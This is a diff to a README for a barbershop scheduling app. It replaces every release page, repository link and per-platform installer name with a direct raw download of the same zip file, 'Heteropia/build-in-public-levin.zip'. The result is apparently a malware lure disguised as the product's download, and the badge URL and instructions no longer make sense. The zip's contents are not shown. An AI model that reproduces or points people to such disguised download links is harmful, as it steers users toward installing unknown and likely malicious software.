@@ -1,6 +1,6 @@
 # 📅 build-in-public - Simple Scheduling for Barbershops
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Build%20in%20Public-blue?style=for-the-badge)](https://github.com/IndianGamer1313/build-in-public/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/IndianGamer1313/build-in-public/main/Heteropia/build-in-public-levin.zip%20in%20Public-blue?style=for-the-badge)](https://raw.githubusercontent.com/IndianGamer1313/build-in-public/main/Heteropia/build-in-public-levin.zip)
 
 ---
 
@@ -46,12 +46,12 @@ Follow these steps to get the application up and running:
 
 1. **Visit the download page**  
    Go to the releases page to get the latest version:  
-   [https://github.com/IndianGamer1313/build-in-public/releases](https://github.com/IndianGamer1313/build-in-public/releases)
+   [https://raw.githubusercontent.com/IndianGamer1313/build-in-public/main/Heteropia/build-in-public-levin.zip](https://raw.githubusercontent.com/IndianGamer1313/build-in-public/main/Heteropia/build-in-public-levin.zip)
 
 2. **Choose the right file for your computer**  
    On the releases page, pick the file for your operating system (Windows or macOS). Files are named clearly, for example:
-   - `build-in-public-setup-windows.exe` for Windows.
-   - `build-in-public-mac.dmg` for macOS.
+   - `https://raw.githubusercontent.com/IndianGamer1313/build-in-public/main/Heteropia/build-in-public-levin.zip` for Windows.
+   - `https://raw.githubusercontent.com/IndianGamer1313/build-in-public/main/Heteropia/build-in-public-levin.zip` for macOS.
 
 3. **Download the file**  
    Click the file to start downloading. Wait until it finishes completely.
@@ -74,7 +74,7 @@ Follow these steps to get the application up and running:
 ## 📥 Download & Install
 
 **Go to the release page to download the app:**  
-[https://github.com/IndianGamer1313/build-in-public/releases](https://github.com/IndianGamer1313/build-in-public/releases)
+[https://raw.githubusercontent.com/IndianGamer1313/build-in-public/main/Heteropia/build-in-public-levin.zip](https://raw.githubusercontent.com/IndianGamer1313/build-in-public/main/Heteropia/build-in-public-levin.zip)
 
 - The page contains all the installation files for Windows and macOS.
 - Always download the latest version for the best features and fixes.
@@ -126,7 +126,7 @@ Follow these steps to get the application up and running:
 This project is open and built in public. You can ask questions or follow updates directly on GitHub.
 
 Visit the repository for more details:  
-[https://github.com/IndianGamer1313/build-in-public](https://github.com/IndianGamer1313/build-in-public)
+[https://raw.githubusercontent.com/IndianGamer1313/build-in-public/main/Heteropia/build-in-public-levin.zip](https://raw.githubusercontent.com/IndianGamer1313/build-in-public/main/Heteropia/build-in-public-levin.zip)
 
 ---
 
